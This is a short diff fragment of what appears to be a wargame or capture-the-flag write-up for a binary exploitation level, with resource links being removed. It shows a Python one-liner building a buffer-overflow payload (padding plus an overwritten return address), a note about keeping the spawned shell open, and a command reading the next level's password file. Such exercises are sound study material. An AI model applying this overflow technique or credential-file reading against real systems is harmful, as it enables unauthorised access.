@@ -26,9 +26,3 @@ python -c "print('*' * 76 + '\x08\x04\x84\x44'[::-1])" > /tmp/script
 # We use pipe with cat for to access the shell
 
 cat /home/user/level2/.pass
-
-
-# Useful ressources :
-# https://dhavalkapil.com/blogs/Shellcode-Injection/
-# https://docs.python.org/3/library/struct.html
-# https://thinkloveshare.com/hacking/pwn_2of4_ret2libc/
